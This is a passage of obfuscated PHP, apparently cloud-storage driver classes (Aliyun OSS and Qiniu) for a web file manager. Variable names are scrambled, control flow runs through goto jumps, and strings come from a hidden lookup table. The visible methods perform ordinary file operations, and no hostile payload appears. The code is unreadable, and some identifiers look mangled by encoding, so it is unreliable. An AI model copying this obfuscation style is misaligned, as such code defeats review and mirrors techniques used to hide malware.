$b”Ùö™¯˜Ù); } if (!$c¶‡—«È­) { $c¶‡—«È­ = $this->pathThis($fèÇù¾âŞ); } goto a¡‡£é‹ÌÊ; f§õå—ÆË: } public function fileOutServer($cêÆÄÄõ†, $dŸÃŸµäğÆ = false, $bİòæ¨Î = false, $e¦¼…÷ì†° = '') { parent::fileOut($cêÆÄÄõ†, $dŸÃŸµäğÆ, $bİòæ¨Î, $e¦¼…÷ì†°); } public function fileOutImage($CÕ¢‘¾¹ì, $FÒÊçĞŒÚ• = 250) { $F„×ñŠğ¨Û = array(OSS\OssClient::OSS_PROCESS => $_SERVER[åÌÛ»ô¢‚ö™][1237] . $FÒÊçĞŒÚ•); $Dõª«Ù¾î = $this->link($CÕ¢‘¾¹ì, $F„×ñŠğ¨Û); $this->fileOutLink($Dõª«Ù¾î); } public function fileOutImageServer($B»«˜ô´, $bÉ˜¯®èƒø = 250) { parent::fileOutImage($B»«˜ô´, $bÉ˜¯®èƒø); } public function fileOutLink($d†×‰â´ˆæ) { $b‘±¾Á¤­ä =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->isCdnHost() && substr($d†×‰â´ˆæ, 0, 7) == $b‘±¾Á¤­ä[1141]) { $d†×‰â´ˆæ = $b‘±¾Á¤­ä[1142] . substr($d†×‰â´ˆæ, 7); } header($b‘±¾Á¤­ä[156] . $d†×‰â´ˆæ); die; } public function hashMd5($CØæ˜œ÷“Ş, $DƒÏå‰”¥ƒ = '') { $BììÈæºè =& $_SERVER[åÌÛ»ô¢‚ö™]; $BËëí¡¨Ïì = $this->_objectMeta($CØæ˜œ÷“Ş); if (!$BËëí¡¨Ïì) { return $BììÈæºè[33]; } if (!isset($BËëí¡¨Ïì[$BììÈæºè[1213]]) && !empty($DƒÏå‰”¥ƒ)) { $eÚÇñÇ—à = $this->updateObjMeta($CØæ˜œ÷“Ş, array($BììÈæºè[1213] => $DƒÏå‰”¥ƒ)); $BËëí¡¨Ïì[$BììÈæºè[1213]] = $eÚÇñÇ—à ? $DƒÏå‰”¥ƒ : $BììÈæºè[33]; } return isset($BËëí¡¨Ïì[$BììÈæºè[1213]]) ? strtolower($BËëí¡¨Ïì[$BììÈæºè[1213]]) : $BììÈæºè[33]; } public function size($CÔªŒ‘«ğØ) { $CòÚ¤ìÚà = $this->objectMeta($CÔªŒ‘«ğØ); return $CòÚ¤ìÚà ? $CòÚ¤ìÚà[$_SERVER[åÌÛ»ô¢‚ö™][77]] : 0; } public function info($EìøĞßóÄ‚) { if ($this->isFolder($EìøĞßóÄ‚)) { return $this->folderInfo($EìøĞßóÄ‚); } else { if ($this->isFile($EìøĞßóÄ‚)) { return $this->fileInfo($EìøĞßóÄ‚); } } return !1; } public function exist($B„ßù÷ªÏ) { return $this->isFile($B„ßù÷ªÏ) || $this->isFolder($B„ßù÷ªÏ); } public function isFile($Dª”˜øÏ†á) { return !$this->isFolder($Dª”˜øÏ†á) && $this->objectMeta($Dª”˜øÏ†á); } public function isFolder($cÏ‡…¯â°) { return $this->cacheMethod($_SERVER[åÌÛ»ô¢‚ö™][205], $cÏ‡…¯â°); } protected function objectMeta($d˜Ú‘´½ì) { return $this->cacheMethod($_SERVER[åÌÛ»ô¢‚ö™][206], $d˜Ú‘´½ì); } protected function _objectMeta($c„Îó±°) { $B«ğ‰Â®É¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; try { $fËä®Œº—ø = $this->client->getObjectMeta($this->bucket, $this->pathEncode($c„Îó±°)); } catch (OSS\Core\OssException $DøàËÑ­×ö) { $fËä®Œº—ø = !1; } if ($fËä®Œº—ø) { $fËä®Œº—ø[$B«ğ‰Â®É¹[77]] = intval($fËä®Œº—ø[$B«ğ‰Â®É¹[1211]]); } return $fËä®Œº—ø; } protected function _isFolder($A´äÊØÉ‚Õ) { $fÉŒÒĞ‰çù =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($A´äÊØÉ‚Õ == $fÉŒÒĞ‰çù[33] || $A´äÊØÉ‚Õ == $fÉŒÒĞ‰çù[8]) { return !0; } $dÈ¦‹³¨ = array($fÉŒÒĞ‰çù[1207] => $fÉŒÒĞ‰çù[8], $fÉŒÒĞ‰çù[1208] => rtrim($A´äÊØÉ‚Õ, $fÉŒÒĞ‰çù[8]) . $fÉŒÒĞ‰çù[8], $fÉŒÒĞ‰çù[1209] => 1, $fÉŒÒĞ‰çù[1210] => $fÉŒÒĞ‰çù[33]); $dùà—“™àğ = $this->client->listObjects($this->bucket, $dÈ¦‹³¨); if ($dùà—“™àğ->getObjectList() || $dùà—“™àğ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($aœ¿»¯ª‰†) { parent::__construct(); require_once SDK_DIR . $_SERVER[åÌÛ»ô¢‚ö™][1238]; $this->_init($aœ¿»¯ª‰†); } public function _init($Aá•²öâã) { goto Ağ¿¨ŠŸ…«; Ağ¿¨ŠŸ…«: $BìæîÈŠº˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($Aá•²öâã as $EŠ¨ÁÒé” => $DÆø»‚¨¾) { if (isset($this->{$EŠ¨ÁÒé”})) { $this->{$EŠ¨ÁÒé”} = $DÆø»‚¨¾; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($BìæîÈŠº˜[1239] . LNG($BìæîÈŠº˜[1198])); } goto c×ùÛ‚ŠÅ›; c×ùÛ‚ŠÅ›: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto eÖ‹µ½çï‘; eÖ‹µ½çï‘: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto CÇ¹ÅàÈÑ»; CÇ¹ÅàÈÑ»: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($CÀÎãÈ‚¶ê, $eĞ§”õ¯‰ = '', $DÏÇé”Å = REPEAT_RENAME) { if ($this->setContent($CÀÎãÈ‚¶ê, $eĞ§”õ¯‰)) { return $this->getPathOuter($CÀÎãÈ‚¶ê); } return !1; } public function mkdir($e»ÍàŠ·á¶, $eÓ®Á¬²Õº = REPEAT_SKIP) { goto E÷Å“¦ÇÓ¥; c¯°‚©ÖË—: $e»ÍàŠ·á¶ = $dƒ™ƒôê““ . $D¼É“¶ˆº½[8]; $cÔ¡‰”è¦‘ = get_path_this($dƒ™ƒôê““); $f¹ÌçÕÀÙŞ = $e»ÍàŠ·á¶ . $cÔ¡‰”è¦‘; goto DÄ”¬ŠÑª; E÷Å“¦ÇÓ¥: $D¼É“¶ˆº½ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dƒ™ƒôê““ = trim($e»ÍàŠ·á¶, $D¼É“¶ˆº½[8]); if ($this->_isFolder($dƒ™ƒôê““)) { return $this->getPathOuter($dƒ™ƒôê““); } goto c¯°‚©ÖË—; DÄ”¬ŠÑª: if (!$this->mkfile($f¹ÌçÕÀÙŞ)) { return !1; } if (!$this->moveFile($f¹ÌçÕÀÙŞ, $e»ÍàŠ·á¶)) { $this->delFile($f¹ÌçÕÀÙŞ); return !1; } return $this->getPathOuter($dƒ™ƒôê““); goto fÂä£æÌì; fÂä£æÌì: } public function copyFile($C…‘—´ÛÍè, $B™ßİ°´Æ®) { $CÏê‡Ô à = $this->bucketManager->copy($this->bucket, $C…‘—´ÛÍè, $this->bucket, $B™ßİ°´Æ®, !0); return $CÏê‡Ô à ? !1 : $this->getPathOuter($B™ßİ°´Æ®); } public function moveFile($C¾Íõ°¨Œ, $BŸ©Ê§ôá) { $F¤ãçíì¡« = $this->bucketManager->move($this->bucket, $C¾Íõ°¨Œ, $this->bucket, $BŸ©Ê§ôá, !0); return $F¤ãçíì¡« ? !1 : $this->getPathOuter($BŸ©Ê§ôá); } public function delFile($bìˆè¯êˆë) { if (!$this->exist($bìˆè¯êˆë)) { return !0; } $AŠ‹æ‰Çº = $this->bucketManager->delete($this->bucket, $bìˆè¯êˆë); return $AŠ‹æ‰Çº ? !1 : !0; } public function delFolder($f˜‹µ¿ˆ»Ì) { goto d×ê‰ĞŞÛé; D˜ãÕàˆ‚: return $this->delByBatch($BíßªŸ…½ƒ[$AšâçßµË[74]]); goto e¥‰ìİÁÖ¨; b¤Å‚¦«†¸: $BíßªŸ…½ƒ = $this->fileList($f˜‹µ¿ˆ»Ì); $this->listItemCache = !0; $aƒìŠÅâËâ = trim($f˜‹µ¿ˆ»Ì, $AšâçßµË[8]) . $AšâçßµË[8]; goto fô¢öÍ’ò; d×ê‰ĞŞÛé: $AšâçßµË =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->exist($f˜‹µ¿ˆ»Ì)) { return !0; } $this->listItemCache = !1; goto b¤Å‚¦«†¸; fô¢öÍ’ò: if (!empty($f˜‹µ¿ˆ»Ì) && !in_array($aƒìŠÅâËâ, $BíßªŸ…½ƒ[$AšâçßµË[74]])) { $BíßªŸ…½ƒ[$AšâçßµË[74]][] = $aƒìŠÅâËâ; } $f»Œ¢ÄÀ‰ = $this->delByBatch($BíßªŸ…½ƒ[$AšâçßµË[73]]); if (!$f»Œ¢ÄÀ‰) { return !1; } goto D˜ãÕàˆ‚; e¥‰ìİÁÖ¨: } private function delByBatch($C¨½åÜÀà) { foreach (array_chunk($C¨½åÜÀà, 1000) as $c´†Ú„ùÄ¾) { $b÷Ş¶µ˜£º = $this->bucketManager->buildBatchDelete($this->bucket, $c´†Ú„ùÄ¾); list($AôÃ¯ó´…ß, $CëËÔë‚ÂÅ) = $this->bucketManager->batch($b÷Ş¶µ˜£º); if ($CëËÔë‚ÂÅ) { return !1; } } return !0; } public function rename($dº•øÅ¾È™, $D¶œä¬­ª¨) { return $this->renameObject($dº•øÅ¾È™, $D¶œä¬­ª¨); } public function fileInfo($Cá‡ä…ËÊ, $F£Ï›¯±²Ğ = false, $e§Íëº¹¯™ = array()) { goto A–¬ÚóˆøÒ; dŸØ‘³øÎÅ: if (isset($e§Íëº¹¯™[$BÂÆøÔ¡Æâ[1241]])) { $EšÅ¦½¨¢[$BÂÆøÔ¡Æâ[107]] = substr($e§Íëº¹¯™[$BÂÆøÔ¡Æâ[1241]] . $BÂÆøÔ¡Æâ[33], 0, 10); } if (isset($e§Íëº¹¯™[$BÂÆøÔ¡Æâ[1240]])) { $EšÅ¦½¨¢[$BÂÆøÔ¡Æâ[77]] = $e§Íëº¹¯™[$BÂÆøÔ¡Æâ[1240]]; } return $EšÅ¦½¨¢; goto b‘ØĞÇèàë; A–¬ÚóˆøÒ: $BÂÆøÔ¡Æâ =& $_SERVER[åÌÛ»ô¢‚ö™]; $EšÅ¦½¨¢ = array($BÂÆøÔ¡Æâ[28] => $this->pathThis($Cá‡ä…ËÊ), $BÂÆøÔ¡Æâ[75] => $this->getPathOuter($BÂÆøÔ¡Æâ[8] . $Cá‡ä…ËÊ), $BÂÆøÔ¡Æâ[29] => $BÂÆøÔ¡Æâ[171], $BÂÆøÔ¡Æâ[77] => isset($e§Íëº¹¯™[$BÂÆøÔ¡Æâ[1240]]) ? $e§Íëº¹¯™[$BÂÆøÔ¡Æâ[1240]] : 0, $BÂÆøÔ¡Æâ[165] => $this->ext($Cá‡ä…ËÊ)); if ($F£Ï›¯±²Ğ) { return $EšÅ¦½¨¢; } goto fòâÊ¨§¹¿; fòâÊ¨§¹¿: $EšÅ¦½¨¢[$BÂÆøÔ¡Æâ[200]] = $EšÅ¦½¨¢[$BÂÆøÔ¡Æâ[107]] = 0; $EšÅ¦½¨¢[$BÂÆøÔ¡Æâ[201]] = $EšÅ¦½¨¢[$BÂÆøÔ¡Æâ[202]] = !0; if (empty($e§Íëº¹¯™)) { $e§Íëº¹¯™ = $this->objectMeta($Cá‡ä…ËÊ); if (!$e§Íëº¹¯™) { return $EšÅ¦½¨¢; } } goto dŸØ‘³øÎÅ; b‘ØĞÇèàë: } public function folderInfo($D–Ñá®§ã, $aÌåˆ¯ Ñ = false) { goto bİ©Éšê®ª; bİ©Éšê®ª: $aôÄ¤é‹İ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¥¿›†ŠÒ = array($aôÄ¤é‹İ[28] => $this->pathThis($D–Ñá®§ã), $aôÄ¤é‹İ[75] => $this->getPathOuter($aôÄ¤é‹İ[8] . $D–Ñá®§ã), $aôÄ¤é‹İ[29] => $aôÄ¤é‹İ[76]); if ($aÌåˆ¯ Ñ) { return $B¥¿›†ŠÒ; } goto Dˆ÷Ï¶Åœ¸; bÕ¯§‹„Ğİ: $F‚ùÜ÷ªìù = $this->objectMeta($D–Ñá®§ã); if (isset($F‚ùÜ÷ªìù[$aôÄ¤é‹İ[1241]])) { $B¥¿›†ŠÒ[$aôÄ¤é‹İ[107]] = substr($F‚ùÜ÷ªìù[$aôÄ¤é‹İ[1241]] . $aôÄ¤é‹İ[33], 0, 10); } return $B¥¿›†ŠÒ; goto d¯ô•µ„·ò; Dˆ÷Ï¶Åœ¸: $B¥¿›†ŠÒ[$aôÄ¤é‹İ[200]] = $B¥¿›†ŠÒ[$aôÄ¤é‹İ[107]] = 0; $B¥¿›†ŠÒ[$aôÄ¤é‹İ[201]] = $B¥¿›†ŠÒ[$aôÄ¤é‹İ[202]] = !0; $D–Ñá®§ã = rtrim($D–Ñá®§ã, $aôÄ¤é‹İ[8]) . $aôÄ¤é‹İ[8]; goto bÕ¯§‹„Ğİ; d¯ô•µ„·ò: } public function listPath($FéõÔÆò”œ, $e£¨à‹ÃŞœ = false) { $dšô’²ğ„ª =& $_SERVER[åÌÛ»ô¢‚ö™]; $A‘äÇò… = $this->fileList($FéõÔÆò”œ, $dšô’²ğ„ª[8], !0); foreach ($A‘äÇò…[$dšô’²ğ„ª[74]] as $eà–ëÔÆ› => $F–Ğ·™´çÔ) { $A‘äÇò…[$dšô’²ğ„ª[74]][$eà–ëÔÆ›] = $this->folderInfo($F–Ğ·™´çÔ, $e£¨à‹ÃŞœ); } foreach ($A‘äÇò…[$dšô’²ğ„ª[73]] as $eà–ëÔÆ› => $F–Ğ·™´çÔ) { $A‘äÇò…[$dšô’²ğ„ª[73]][$eà–ëÔÆ›] = $this->fileInfo($F–Ğ·™´çÔ[$dšô’²ğ„ª[89]], $e£¨à‹ÃŞœ, $F–Ğ·™´çÔ); } return $A‘äÇò…; } public function has($CòŒÂ‰Å°¸, $E¶è¢Ì’Û¸ = false, $Eˆ’ãÑ¥ä = true) { goto aéÉ—îÉÆ¾; CÃ”–¹Ï: return !1; goto Aì¸“è»ç»; aËêÍ¦Šá²: $CµëøĞÅ¿Ç = $f±Î‡É‚ĞÔ[33]; $f‰Œî¾ö² = 500; $cŸ£Ê”å²¬ = $f±Î‡É‚ĞÔ[8]; goto F¹í«»ßÓÒ; aéÉ—îÉÆ¾: $f±Î‡É‚ĞÔ =& $_SERVER[åÌÛ»ô¢‚ö™]; $CòŒÂ‰Å°¸ = trim($CòŒÂ‰Å°¸, $f±Î‡É‚ĞÔ[8]); $D†…í•‡®‹ = empty($CòŒÂ‰Å°¸) ? $f±Î‡É‚ĞÔ[33] : $CòŒÂ‰Å°¸ . $f±Î‡É‚ĞÔ[8]; goto aËêÍ¦Šá²; F¹í«»ßÓÒ: $B¦‹‹Äßˆ = $C‹Ğ°Ê¾¼ = 0; while (!0) { check_abort(); list($CĞ‚Ù“¾ÉÊ, $bËƒª´Şì¨) = $this->bucketManager->listFiles($this->bucket, $D†…í•‡®‹, $CµëøĞÅ¿Ç, $f‰Œî¾ö², $cŸ£Ê”å²¬); if ($bËƒª´Şì¨) { break; } $CµëøĞÅ¿Ç = array_key_exists($f±Î‡É‚ĞÔ[1210], $CĞ‚Ù“¾ÉÊ) ? $CµëøĞÅ¿Ç = $CĞ‚Ù“¾ÉÊ[$f±Î‡É‚ĞÔ[1242]] : $f±Î‡É‚ĞÔ[33]; if ($E¶è¢Ì’Û¸) { if (!empty($CĞ‚Ù“¾ÉÊ[$f±Î‡É‚ĞÔ[1243]])) { $B¦‹‹Äßˆ += count($CĞ‚Ù“¾ÉÊ[$f±Î‡É‚ĞÔ[1243]]); } if (!empty($CĞ‚Ù“¾ÉÊ[$f±Î‡É‚ĞÔ[1244]])) { $C‹Ğ°Ê¾¼ += count($CĞ‚Ù“¾ÉÊ[$f±Î‡É‚ĞÔ[1244]]); } if ($CµëøĞÅ¿Ç === $f±Î‡É‚ĞÔ[33]) { break; } continue; } if ($Eˆ’ãÑ¥ä) { if (!empty($CĞ‚Ù“¾ÉÊ[$f±Î‡É‚ĞÔ[1243]])) { return !0; } } else { if (!empty($CĞ‚Ù“¾ÉÊ[$f±Î‡É‚ĞÔ[1244]])) { return !0; } } if ($CµëøĞÅ¿Ç === $f±Î‡É‚ĞÔ[33]) { break; } } if ($E¶è¢Ì’Û¸) { return array($f±Î‡É‚ĞÔ[209] => $B¦‹‹Äßˆ, $f±Î‡É‚ĞÔ[210] => $C‹Ğ°Ê¾¼); } goto CÃ”–¹Ï; Aì¸“è»ç»: } public function listAll($a ¥İª¶º) { $d‚¯Òè Ú =& $_SERVER[åÌÛ»ô¢‚ö™]; $BµÇ‘óæ‘¸ = $this->fileList($a ¥İª¶º, $d‚¯Òè Ú[33], !0); $aÅŒø¨ „ƒ = array(); foreach ($BµÇ‘óæ‘¸[$d‚¯Òè Ú[73]] as $f‰ä°ç§ìµ) { $aÅŒø¨ „ƒ[$f‰ä°ç§ìµ[$d‚¯Òè Ú[89]]] = $f‰ä°ç§ìµ[$d‚¯Òè Ú[77]]; } foreach ($BµÇ‘óæ‘¸[$d‚¯Òè Ú[74]] as $f‰ä°ç§ìµ) { if (is_string($f‰ä°ç§ìµ)) { $aÅŒø¨ „ƒ[$f‰ä°ç§ìµ] = 0; } } return $this->listAllFiles($a ¥İª¶º, array_keys($aÅŒø¨ „ƒ), $aÅŒø¨ „ƒ); } private function fileList($Cº¡¸Åô, $AìäÔ­õÊó = '', $d¦»«“óÔ¬ = 0) { goto B¹·áæ¦å; Bğ¬ˆ„È‘®: $bŠÃ…âğš = $b—Îœ¾¨öí[33]; $B×¿¥…„‚Œ = 1000; $aÈÙ¼¾ÓË = $this->listItemCache === !1 ? !1 : !0; goto cí„«îŞîÇ; dÅƒéé×: return array($b—Îœ¾¨öí[74] => $bğĞ†ãÎ…Ô, $b—Îœ¾¨öí[73] => $DÎ÷šÛ—…); goto A¿À¡ƒÒ±; cí„«îŞîÇ: $bğĞ†ãÎ…Ô = $DÎ÷šÛ—… = array(); while (!0) { check_abort(); list($CŸÒŸÎ¶Ğ, $bª¾„ÖƒÌó) = $this->bucketManager->listFiles($this->bucket, $D¨ÒÄ¨£¢, $bŠÃ…âğš, $B×¿¥…„‚Œ, $AìäÔ­õÊó); if ($bª¾„ÖƒÌó) { break; } $bŠÃ…âğš = array_key_exists($b—Îœ¾¨öí[1210], $CŸÒŸÎ¶Ğ) ? $bŠÃ…âğš = $CŸÒŸÎ¶Ğ[$b—Îœ¾¨öí[1242]] : $b—Îœ¾¨öí[33]; $FÆŠĞòÜ‹ = isset($CŸÒŸÎ¶Ğ[$b—Îœ¾¨öí[1243]]) ? $CŸÒŸÎ¶Ğ[$b—Îœ¾¨öí[1243]] : array(); $däî¼èÖøî = isset($CŸÒŸÎ¶Ğ[$b—Îœ¾¨öí[1244]]) ? $CŸÒŸÎ¶Ğ[$b—Îœ¾¨öí[1244]] : array(); foreach ($FÆŠĞòÜ‹ as $f¿Ÿİçç†µ) { goto d¸‚×‰£¤†; d¸‚×‰£¤†: if ($f¿Ÿİçç†µ[$b—Îœ¾¨öí[89]] == $D¨ÒÄ¨£¢) { continue; } $aœÒ½£¾Æå = $f¿Ÿİçç†µ[$b—Îœ¾¨öí[89]]; $d…Õ–¸„ŞÈ = $f¿Ÿİçç†µ[$b—Îœ¾¨öí[1240]]; goto CìëÁÄ—; CìëÁÄ—: $f¿Ÿİçç†µ[$b—Îœ¾¨öí[77]] = $d…Õ–¸„ŞÈ; $EãàÕÖ®¦á = $d…Õ–¸„ŞÈ == 0 && substr($aœÒ½£¾Æå, strlen($aœÒ½£¾Æå) - 1, 1) == $b—Îœ¾¨öí[8] ? !0 : !1; if ($aÈÙ¼¾ÓË) { $this->cacheMethod($b—Îœ¾¨öí[205], $aœÒ½£¾Æå, $EãàÕÖ®¦á); $this->cacheMethod($b—Îœ¾¨öí[206], $aœÒ½£¾Æå, $f¿Ÿİçç†µ); } goto d‰µ÷ÌğÅÑ; d‰µ÷ÌğÅÑ: if ($EãàÕÖ®¦á) { $bğĞ†ãÎ…Ô[] = $aœÒ½£¾Æå; continue; } $DÎ÷šÛ—…[] = $d¦»«“óÔ¬ ? $f¿Ÿİçç†µ : $aœÒ½£¾Æå; goto e‹¶‰ö×Îâ; e‹¶‰ö×Îâ: } foreach ($däî¼èÖøî as $aœÒ½£¾Æå) { if ($aœÒ½£¾Æå == $D¨ÒÄ¨£¢) { continue; } $bğĞ†ãÎ…Ô[] = $aœÒ½£¾Æå; if ($aÈÙ¼¾ÓË) { $this->cacheMethod($b—Îœ¾¨öí[205], $aœÒ½£¾Æå, !0); } } if ($bŠÃ…âğš === $b—Îœ¾¨öí[33]) { break; } } if ($aÈÙ¼¾ÓË) { $this->cacheMethod($b—Îœ¾¨öí[205], $Cº¡¸Åô, !0); } goto dÅƒéé×; B¹·áæ¦å: $b—Îœ¾¨öí =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cº¡¸Åô = trim($Cº¡¸Åô, $b—Îœ¾¨öí[8]); $D¨ÒÄ¨£¢ = empty($Cº¡¸Åô) ? $b—Îœ¾¨öí[33] : $Cº¡¸Åô . $b—Îœ¾¨öí[8]; goto Bğ¬ˆ„È‘®; A¿À¡ƒÒ±: } public function canRead($dèœÇ©‘æ) { return $this->exist($dèœÇ©‘æ) ? !0 : !1; } public function canWrite($D§Æ¸¾¿Ó) { return $this->exist($D§Æ¸¾¿Ó) ? !0 : !1; } public function getContent($Eã£‘¿ÕØæ) { return $this->fileSubstr($Eã£‘¿ÕØæ, 0, -1); } public function setContent($fÜÕ¯±’¸¬, $fæàåØø = '') { $d•Šƒ‘Ş¬ = $this->tempFile($this->pathThis($fÜÕ¯±’¸¬)); file_put_contents($d•Šƒ‘Ş¬, $fæàåØø); if ($this->upload($fÜÕ¯±’¸¬, $d•Šƒ‘Ş¬)) { $this->tempFileRemve($d•Šƒ‘Ş¬); return !0; } return !1; } public function refreshUrls($cÜ¡ô­ªôñ) { goto dÒõµ±Ñ»Œ; E‘Ñ£ù¨â: return $cßø†ëá…—[$f•×‚ˆ‰¥§[1245]] == $f•×‚ˆ‰¥§[723] ? !0 : !1; goto eİİ¤²¤‰; eğ¢‚—ƒÏ: $B›ƒ‰ë‡ò = new Qiniu\Cdn\CdnManager($this->auth); list($cßø†ëá…—, $Aˆ÷ÛÑãó) = $B›ƒ‰ë‡ò->refreshUrls($DÓÔÂö·¾á); if ($Aˆ÷ÛÑãó) { return !1; } goto E‘Ñ£ù¨â; dÒõµ±Ñ»Œ: $f•×‚ˆ‰¥§ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÓÔÂö·¾á = array(); if (is_array($cÜ¡ô­ªôñ)) { foreach ($cÜ¡ô­ªôñ as $DÜœÛä­ï¡) { $DÓÔÂö·¾á[] = $this->link($DÜœÛä­ï¡); } } else { $DÓÔÂö·¾á[] = $this->link($cÜ¡ô­ªôñ); } goto eğ¢‚—ƒÏ; eİİ¤²¤‰: } public function fileSubstr($e”ìéåò‘Í, $FòĞêãË…æ, $aŒ‡ó²µˆ«) { $cğöÂíª… =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!($f§â£Äª—î = $this->link($e”ìéåò‘Í))) { return !1; } $fòÃìƒçˆ¹ = !1; if ($aŒ‡ó²µˆ« > 0) { $D÷¬ó˜î– = $FòĞêãË…æ + $aŒ‡ó²µˆ« - 1; $fòÃìƒçˆ¹ = array($cğöÂíª…[1246] . $FòĞêãË…æ . $cğöÂíª…[437] . $D÷¬ó˜î–); } $BâªÈÎŸòÜ = url_request($f§â£Äª—î, $cğöÂíª…[234], !1, $fòÃìƒçˆ¹); return $BâªÈÎŸòÜ[$cğöÂíª…[716]] ? $BâªÈÎŸòÜ[$cğöÂíª…[1061]] : !1; } public function upload($f³ö·¿•¾‘, $câ¢Å‹æï, $A«ğù¤Íß› = false, $aò‰ƒç†ô = REPEAT_REPLACE) { $Eù†‘á‚Úİ = new Qiniu\Storage\UploadManager(); $Cİ‚ø¿ò  = $this->auth->uploadToken($this->bucket, $f³ö·¿•¾‘); $f¥£¨èŒ¸ = get_file_mime(get_path_ext($câ¢Å‹æï)); list($fÃã³öŸ“÷, $F…‰‰‘å‰Õ) = $Eù†‘á‚Úİ->putFile($Cİ‚ø¿ò , $f³ö·¿•¾‘, $câ¢Å‹æï, null, $f¥£¨èŒ¸); return $F…‰‰‘å‰Õ ? !1 : $this->getPathOuter($f³ö·¿•¾‘); } public function uploadFormData($dÍéÄó½³Ç, $fïÖÊáÛ¹† = 3600) { return $this->uploadToken($dÍéÄó½³Ç, $fïÖÊáÛ¹†); } public function multiUploadFormData($aÍö‘®îÉ, $B¢ÇÔá  = 3600) { return $this->uploadToken($aÍö‘®îÉ, $B¢ÇÔá ); } private function uploadToken($dô‡ğŠÉ‹ß, $c¹¯¤´ˆµó = 3600) { goto C‹Ò”õÄŒ; C‹Ò”õÄŒ: $e†É‰ÀæÃÃ =& $_SERVER[åÌÛ»ô¢‚ö™]; $E”¼ç¯êô = $c¹¯¤´ˆµó; $A¦éØÎğ‘ = array($e†É‰ÀæÃÃ[1247] => $e†É‰ÀæÃÃ[1248]); goto d•‡Ó¯›ê; d•‡Ó¯›ê: $E°®ÚµõèÛ = $dô‡ğŠÉ‹ß; $fÅğÁ¯ÈØ = $this->auth->uploadToken($this->bucket, $E°®ÚµõèÛ, $E”¼ç¯êô, $A¦éØÎğ‘, !0); $bÜÉˆ±³ï = empty($this->region) || $this->region == $e†É‰ÀæÃÃ[1249] ? $e†É‰ÀæÃÃ[33] : $e†É‰ÀæÃÃ[437] . $this->region; goto d”ÎïÃÍ½ù; d”ÎïÃÍ½ù: $dÉ¶¤æÅ–• = http_type() . "\72\57\57\x75\x70\x6c\x6f\141\x64{$bÜÉˆ±³ï}\56\161\x69\x6e\x69\165\x70\56\x63\157\x6d\x2f"; return array($e†É‰ÀæÃÃ[1250] => $fÅğÁ¯ÈØ, $e†É‰ÀæÃÃ[1251] => $dÉ¶¤æÅ–•); goto fíÎÇÅå½; fíÎÇÅå½: } public function download($Då“ëÔÛŒ, $Eå¿ïõ¸“ß) { goto E˜Í¥†ø˜Ñ; E˜Í¥†ø˜Ñ: $c³¨ÚÆË‹Œ = IO::getPathInner(IO::mkfile($Eå¿ïõ¸“ß)); if (!($e£´†‘Šô = $this->link($Då“ëÔÛŒ))) { return !1; } $B„ãó±—Ÿ¿ = 0; goto d­’ÙàĞã; d­’ÙàĞã: $AœÊ¸–ÑÙŸ = 1024 * 200; $C“Ä´´ƒ˜Œ = fopen($c³¨ÚÆË‹Œ, $_SERVER[åÌÛ»ô¢‚ö™][1252]); while (!0) { $B¤³‰±Íö = $this->fileSubstr($Då“ëÔÛŒ, $B„ãó±—Ÿ¿, $AœÊ¸–ÑÙŸ); if ($B¤³‰±Íö === !1) { return !1; } fwrite($C“Ä´´ƒ˜Œ, $B¤³‰±Íö); $B„ãó±—Ÿ¿ += $AœÊ¸–ÑÙŸ; if (strlen($B¤³‰±Íö) < $AœÊ¸–ÑÙŸ) { break; } } goto B×›Çí¢¥Â; B×›Çí¢¥Â: fclose($C“Ä´´ƒ˜Œ); return $Eå¿ïõ¸“ß; goto D°¨ØË ö˜; D°¨ØË ö˜: } public function link($cñ©¹‡™ãï, $f¾š˜÷±‘ƒ = '') { if (!$this->isFile($cñ©¹‡™ãï)) { return !1; } $dôÂøº¬Ğà = $this->getHost() . $_SERVER[åÌÛ»ô¢‚ö™][8] . $this->pathEncode($cñ©¹‡™ãï) . $f¾š˜÷±‘ƒ; return $this->auth->privateDownloadUrl($dôÂøº¬Ğà, 3600 * 12); } public function fileOut($còÚ·‰ÃÄ, $dºçò—ƒœÇ = false, $FôÁˆŒÃµ = false, $dî‡åã¾ÓÓ = '') { $b«­ÜéÉÎÃ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->isFileOutServer()) { return $this->fileOutServer($còÚ·‰ÃÄ, $dºçò—ƒœÇ, $FôÁˆŒÃµ, $dî‡åã¾ÓÓ); } if (!$FôÁˆŒÃµ) { $FôÁˆŒÃµ = $this->pathThis($còÚ·‰ÃÄ); } $bÑÄÀÏ½ƒƒ = $dºçò—ƒœÇ ? $b«­ÜéÉÎÃ[1253] . rawurlencode($FôÁˆŒÃµ) : $b«­ÜéÉÎÃ[33]; $A¿âÜ¼Š³ = $this->link($còÚ·‰ÃÄ, $bÑÄÀÏ½ƒƒ); $this->fileOutLink($A¿âÜ¼Š³); } public function fileOutServer($eÀõÒùŠèá, $E©ÑŠ¬ = false, $CŒ–¨ïÛ¡ = false, $f†Ä¤Êê” = '') { parent::fileOut($eÀõÒùŠèá, $E©ÑŠ¬, $CŒ–¨ïÛ¡, $f†Ä¤Êê”); } public function fileOutImage($FÙÅˆ¼¶ÙÆ, $bªï«ŠÛ¥ = 250) { $BÍÂ¬£†µ = $this->link($FÙÅˆ¼¶ÙÆ, $_SERVER[åÌÛ»ô¢‚ö™][1254] . $bªï«ŠÛ¥); 